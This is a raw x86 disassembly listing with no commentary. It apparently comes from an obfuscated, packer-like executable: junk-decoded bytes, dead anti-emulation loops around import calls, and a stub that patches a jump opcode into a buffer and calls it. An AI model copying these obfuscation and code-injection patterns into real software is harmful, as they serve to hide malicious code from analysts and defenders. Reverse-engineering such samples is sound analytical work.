  416c40:	xchg   ebx,eax
  416c41:	imul   esi,DWORD PTR [ebx+0x1b],0xb
  416c45:	sub    ch,ch
  416c47:	push   edi
  416c48:	scas   eax,DWORD PTR es:[edi]
  416c49:	xrelease xchg BYTE PTR [edi+0x44728cab],dl
  416c50:	cmp    cl,dl
  416c52:	ja     0x416c9b
  416c54:	mov    al,ds:0x48eaf67f
  416c59:	mov    eax,ds:0x8c694bcd
  416c5e:	cli    
  416c5f:	popf   
  416c60:	in     eax,dx
  416c61:	adc    dh,bh
  416c63:	es add eax,0x8ccb753
  416c69:	xor    esp,DWORD PTR [ebp+0x450e43cc]
  416c6f:	outs   dx,DWORD PTR ds:[esi]
  416c70:	mov    ebx,0x4cacea9f
  416c75:	(bad)  
  416c76:	push   ss
  416c77:	add    eax,0x727470a2
  416c7c:	sti    
  416c7d:	xchg   ecx,eax
  416c7e:	sbb    eax,0x494f129c
  416c83:	std    
  416c84:	dec    ecx
  416c85:	addr16 jb 0x416c55
  416c88:	xchg   edx,eax
  416c89:	push   ss
  416c8a:	cmp    ch,dl
  416c8c:	aaa    
  416c8d:	cld    
  416c8e:	inc    esp
  416c8f:	pop    ds
  416c90:	inc    eax
  416c91:	xchg   ebp,eax
  416c92:	add    ecx,DWORD PTR [ebx+ecx*8]
  416c95:	das    
  416c96:	mov    eax,ds:0x31cab581
  416c9b:	shl    BYTE PTR [esi-0x781f79ba],0x9c
  416ca2:	mov    dl,0x34
  416ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ca5:	dec    ecx
  416ca6:	clc    
  416ca7:	dec    esi
  416ca8:	daa    
  416ca9:	call   0x9e5a:0xd879a46d
  416cb0:	fisubr DWORD PTR [esi-0x1a93522c]
  416cb6:	dec    ebp
  416cb7:	shr    esi,1
  416cb9:	sub    esp,0x17e18da5
  416cbf:	mul    DWORD PTR [ebx]
  416cc1:	mov    es,WORD PTR [esi+0x3e]
  416cc4:	gs dec esi
  416cc6:	xor    DWORD PTR [esi-0x3edfb31d],0x5b
  416ccd:	pushf  
  416cce:	pop    edx
  416ccf:	js     0x416cbe
  416cd1:	mov    ebx,DWORD PTR [ebp-0x8]
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428e51
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af15
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x42fa2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x42fa00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428e5d
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x42fa04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x42fa38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x42fa08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429eb1
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429ec5
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429ec5
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x42fa3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x42fa40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x42fa0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x42fa44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x42fa10
